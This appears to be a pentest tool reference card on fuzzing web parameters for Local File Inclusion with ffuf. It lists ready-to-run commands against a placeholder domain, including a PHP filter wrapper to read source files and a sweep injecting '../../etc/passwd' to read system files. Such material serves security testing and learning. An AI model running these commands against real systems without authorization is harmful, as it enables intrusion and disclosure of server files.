---
id: "ffuf-lfi"
title: "FFUF LFI Fuzzing"
type: "tool"
category: "web-application"
subcategory: "lfi"
tags: ["lfi", "ffuf-lfi", "injection", "lfi-testing", "parameter-fuzzing", "json-output"]
difficulty: "beginner"
platforms: ["linux", "macos"]
source_url: "https://github.com/ffuf/ffuf"
related: []
updated: "2026-03-30"
---

## Overview

Local File Inclusion testing using FFUF with LFI payloads.

## Command Reference

```bash
ffuf -u 'https://{domain}/page?file=FUZZ' -w /opt/wordlists/lfi_payloads.txt -t 10 -rate 50 -mc 200 -o {domain}_lfi_results.json
echo "[+] FFUF: LFI fuzzing completed"
```

## Features

- LFI testing
- Parameter fuzzing
- JSON output

## Documentation

- [Official Documentation](https://github.com/ffuf/ffuf)

## Effectiveness Scores

| Category   | Score |
|------------|-------|
| Web App    | 0.9   |
| API        | 0.4   |
| Network    | 0.0   |
| Cloud      | 0.1   |
| CMS        | 0.6   |

## Fallback Alternatives

- **wfuzz** - Alternative fuzzer with LFI payload support
- **burpsuite** - Intruder module for LFI testing with manual analysis
- **nuclei** - LFI templates for automated detection

## Context-Aware Parameters

**Standard LFI fuzzing**
```bash
ffuf -u 'https://{domain}/page?file=FUZZ' -w /opt/wordlists/lfi_payloads.txt -t 10 -rate 50 -mc 200 -o {domain}_lfi_results.json
```

**LFI with filter bypass (null byte, encoding)**
```bash
ffuf -u 'https://{domain}/page?file=FUZZ' -w /opt/wordlists/lfi_bypass.txt -t 5 -rate 30 -mc 200 -fs 0 -o {domain}_lfi_bypass.json
```

**PHP wrapper LFI testing**
```bash
ffuf -u 'https://{domain}/page?file=php://filter/convert.base64-encode/resource=FUZZ' -w /opt/wordlists/php_files.txt -t 10 -rate 50 -mc 200 -o {domain}_lfi_php.json
```

**LFI across multiple parameters**
```bash
ffuf -u 'https://{domain}/page?FUZZ=../../etc/passwd' -w /opt/wordlists/parameters.txt -t 10 -rate 50 -mr "root:" -o {domain}_lfi_params.json
```
